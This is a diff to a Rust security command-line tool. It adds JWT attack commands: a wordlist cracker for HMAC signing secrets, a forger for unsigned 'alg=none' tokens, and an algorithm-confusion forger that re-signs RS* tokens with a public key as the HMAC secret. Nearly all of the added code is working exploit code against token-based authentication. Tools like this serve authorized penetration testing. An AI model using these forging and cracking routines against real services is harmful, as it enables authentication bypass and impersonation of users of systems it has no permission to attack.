@@ -1,6 +1,9 @@
 use anyhow::{Context, Result};
 use base64::{Engine, engine::general_purpose::URL_SAFE_NO_PAD};
 use clap::Subcommand;
+use std::path::PathBuf;
+
+use super::hmac;
 
 #[derive(Subcommand)]
 pub enum JwtAction {
@@ -13,6 +16,42 @@ pub enum JwtAction {
     Analyze {
         #[arg(help = "JWT token string")]
         token: String,
+    },
+    #[command(about = "Dictionary-attack the HMAC secret of an HS* JWT")]
+    Crack {
+        #[arg(help = "JWT token string")]
+        token: String,
+        #[arg(short, long, help = "Wordlist file (one secret per line)")]
+        wordlist: PathBuf,
+    },
+    #[command(about = "Forge a token with alg=none (empty signature)")]
+    ForgeNone {
+        #[arg(
+            help = "Existing JWT (payload kept) or raw JSON payload string",
+            required_unless_present = "payload"
+        )]
+        token: Option<String>,
+        #[arg(short, long, help = "Raw JSON payload (overrides token payload)")]
+        payload: Option<String>,
+    },
+    #[command(
+        about = "Algorithm-confusion forge: re-sign RS* token as HS256 using a public key file as HMAC secret"
+    )]
+    Confuse {
+        #[arg(help = "JWT token string (header/payload source)")]
+        token: String,
+        #[arg(
+            short,
+            long,
+            help = "Public key file (PEM or raw bytes used as HMAC secret)"
+        )]
+        key: PathBuf,
+        #[arg(
+            long,
+            default_value = "HS256",
+            help = "Symmetric algorithm to forge (HS256/HS384/HS512)"
+        )]
+        alg: String,
     },
 }
 
@@ -39,6 +78,27 @@ pub fn run(action: JwtAction) -> Result<()> {
                     println!("  [!] {}", w);
                 }
             }
+        }
+        JwtAction::Crack { token, wordlist } => match crack_hmac_secret(&token, &wordlist)? {
+            Some(secret) => println!("Found secret: {}", secret),
+            None => println!("Not found"),
+        },
+        JwtAction::ForgeNone { token, payload } => {
+            let payload_json = if let Some(p) = payload {
+                p
+            } else if let Some(t) = token {
+                decode(&t)?.payload
+            } else {
+                anyhow::bail!("Provide a token or --payload");
+            };
+            let forged = forge_none(&payload_json)?;
+            println!("{}", forged);
+        }
+        JwtAction::Confuse { token, key, alg } => {
+            let key_bytes = std::fs::read(&key)
+                .with_context(|| format!("Failed to read key file: {}", key.display()))?;
+            let forged = forge_alg_confusion(&token, &key_bytes, &alg)?;
+            println!("{}", forged);
         }
     }
     Ok(())
@@ -139,4 +199,165 @@ pub fn find_vulnerabilities(header_json: &str) -> Vec<String> {
     }
 
     warnings
+}
+
+fn signing_input(token: &str) -> Result<String> {
+    let token = token.trim();
+    let segments: Vec<&str> = token.split('.').collect();
+    if segments.len() < 2 {
+        anyhow::bail!("Invalid JWT format");
+    }
+    Ok(format!("{}.{}", segments[0], segments[1]))
+}
+
+fn signature_bytes(token: &str) -> Result<Vec<u8>> {
+    let token = token.trim();
+    let segments: Vec<&str> = token.split('.').collect();
+    if segments.len() != 3 {
+        anyhow::bail!("Invalid JWT format: expected 3 parts");
+    }
+    URL_SAFE_NO_PAD
+        .decode(segments[2])
+        .context("Failed to decode JWT signature")
+}
+
+/// Verify an HS* JWT against a candidate secret.
+pub fn verify_hs(token: &str, secret: &[u8]) -> Result<bool> {
+    let parts = decode(token)?;
+    let alg = extract_algorithm(&parts.header).to_ascii_uppercase();
+    let msg = signing_input(token)?;
+    let expected = signature_bytes(token)?;
+    let actual = match alg.as_str() {
+        "HS256" => {
+            let hex = hmac::hmac_sha256(secret, msg.as_bytes());
+            hex::decode(hex).context("internal hex decode")?
+        }
+        "HS384" => {
+            // SHA-384 via sha2
+            use sha2::Sha384;
+            hmac_digest::<Sha384>(secret, msg.as_bytes(), 128)
+        }
+        "HS512" => {
+            let hex = hmac::hmac_sha512(secret, msg.as_bytes());
+            hex::decode(hex).context("internal hex decode")?
+        }
+        other => anyhow::bail!("Unsupported or non-HMAC algorithm for crack: {}", other),
+    };
+    Ok(constant_time_eq(&expected, &actual))
+}
+
+fn hmac_digest<D: sha2::Digest>(key: &[u8], message: &[u8], block_size: usize) -> Vec<u8> {
+    let actual_key = if key.len() > block_size {
+        let mut hasher = D::new();
+        hasher.update(key);
+        hasher.finalize().to_vec()
+    } else {
+        key.to_vec()
+    };
+    let mut padded_key = vec![0u8; block_size];
+    padded_key[..actual_key.len()].copy_from_slice(&actual_key);
+    let ipad: Vec<u8> = padded_key.iter().map(|&k| k ^ 0x36).collect();
+    let opad: Vec<u8> = padded_key.iter().map(|&k| k ^ 0x5c).collect();
+    let mut inner = D::new();
+    inner.update(&ipad);
+    inner.update(message);
+    let inner_hash = inner.finalize();
+    let mut outer = D::new();
+    outer.update(&opad);
+    outer.update(&inner_hash);
+    outer.finalize().to_vec()
+}
+
+fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
+    if a.len() != b.len() {
+        return false;
+    }
+    let mut diff = 0u8;
+    for (x, y) in a.iter().zip(b.iter()) {
+        diff |= x ^ y;
+    }
+    diff == 0
+}
+
+pub fn crack_hmac_secret(token: &str, wordlist: &PathBuf) -> Result<Option<String>> {
+    let parts = decode(token)?;
+    let alg = extract_algorithm(&parts.header).to_ascii_uppercase();
+    if !matches!(alg.as_str(), "HS256" | "HS384" | "HS512") {
+        anyhow::bail!(
+            "Token algorithm is {} (need HS256/HS384/HS512 for dictionary crack)",
+            alg
+        );
+    }
+
+    let bytes = std::fs::read(wordlist)
+        .with_context(|| format!("Failed to read wordlist: {}", wordlist.display()))?;
+    for line in bytes.split(|&b| b == b'\n') {
+        let line = line.strip_suffix(b"\r").unwrap_or(line);
+        if line.is_empty() {
+            continue;
+        }
+        // Try raw bytes and UTF-8 lossy form
+        if verify_hs(token, line)? {
+            return Ok(Some(String::from_utf8_lossy(line).into_owned()));
+        }
+    }
+    Ok(None)
+}
+
+/// Forge alg=none token (header with none + given payload + empty signature).
+pub fn forge_none(payload_json: &str) -> Result<String> {
+    // Validate payload is JSON object-ish
+    let _: serde_json::Value =
+        serde_json::from_str(payload_json).context("Payload is not valid JSON")?;
+    let header = r#"{"alg":"none","typ":"JWT"}"#;
+    let h = URL_SAFE_NO_PAD.encode(header.as_bytes());
+    let p = URL_SAFE_NO_PAD.encode(payload_json.as_bytes());
+    // Empty signature segment (some libs accept trailing dot with empty sig)
+    Ok(format!("{}.{}.", h, p))
+}
+
+/// Re-sign token header/payload as HS* using arbitrary key material (alg confusion).
+pub fn forge_alg_confusion(token: &str, key: &[u8], alg: &str) -> Result<String> {
+    let parts = decode(token)?;
+    let alg_up = alg.to_ascii_uppercase();
+    if !matches!(alg_up.as_str(), "HS256" | "HS384" | "HS512") {
+        anyhow::bail!("Forge algorithm must be HS256, HS384, or HS512");
+    }
+
+    let mut header_val: serde_json::Value =
+        serde_json::from_str(&parts.header).context("Invalid header JSON")?;
+    header_val["alg"] = serde_json::Value::String(alg_up.clone());
+    let header_json = serde_json::to_string(&header_val)?;
+
+    let h = URL_SAFE_NO_PAD.encode(header_json.as_bytes());
+    let p = URL_SAFE_NO_PAD.encode(parts.payload.as_bytes());
+    let signing = format!("{}.{}", h, p);
+
+    let sig = match alg_up.as_str() {
+        "HS256" => {
+            let hex = hmac::hmac_sha256(key, signing.as_bytes());
+            hex::decode(hex).context("internal hex decode")?
+        }
+        "HS384" => {
+            use sha2::Sha384;
+            hmac_digest::<Sha384>(key, signing.as_bytes(), 128)
+        }
+        "HS512" => {
+            let hex = hmac::hmac_sha512(key, signing.as_bytes());
+            hex::decode(hex).context("internal hex decode")?
+        }
+        _ => unreachable!(),
+    };
+    let s = URL_SAFE_NO_PAD.encode(&sig);
+    Ok(format!("{}.{}.{}", h, p, s))
+}
+
+/// Crack against an in-memory list of secrets (for tests).
+pub fn crack_hmac_secret_list(token: &str, secrets: &[&str]) -> Result<Option<String>> {
+    for s in secrets {
+        if verify_hs(token, s.as_bytes())? {
+            return Ok(Some((*s).to_string()));
+        }
+    }
+    Ok(None)
 }
